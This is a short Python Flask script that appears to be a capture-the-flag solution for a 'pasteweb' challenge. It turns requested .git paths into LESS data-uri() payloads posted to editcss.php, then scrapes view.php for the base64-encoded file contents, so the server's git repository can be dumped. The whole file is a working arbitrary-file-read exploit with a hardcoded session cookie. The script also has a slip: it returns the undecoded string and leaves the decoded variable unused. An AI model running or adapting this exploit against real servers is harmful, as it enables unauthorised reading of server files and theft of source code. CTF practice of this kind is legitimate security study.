from flask import Flask
from markupsafe import escape
import requests
from flask import Response
import base64

app = Flask(__name__)

cookies = {
    'PHPSESSID': 'aqtqpt7em903vhhi1f6inbn02p',
}

headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
    'Accept-Language': 'zh-TW,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-Hans;q=0.6,und;q=0.5',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Origin': 'https://pasteweb.ctf.zoolab.org',
    'Referer': 'https://pasteweb.ctf.zoolab.org/editcss.php',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Sec-GPC': '1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Brave";v="108"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

@app.route('/.git/<path:subpath>')
def index(subpath):
    path = '/var/www/html/.git/' + subpath

    data = {
        'less': ".meow {\n content: data-uri('" + path + "');\n}",
    }

    requests.post('https://pasteweb.ctf.zoolab.org/editcss.php', cookies=cookies, headers=headers, data=data)
    response = requests.post('https://pasteweb.ctf.zoolab.org/view.php', cookies=cookies, headers=headers)
    
    data = response.text.split('\n')[7].split('"')[1]
    constent = base64.b64decode(data[data.find('base64,')+7:])
    return Response(data, mimetype='application/octet-stream')

if __name__ == "__main__":
    app.run()